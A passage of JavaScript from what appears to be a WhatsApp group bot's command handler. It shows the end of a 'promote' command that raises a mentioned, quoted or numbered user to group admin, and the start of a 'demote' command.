let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await keepmods.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isGroup) return reply(mess.only.group)
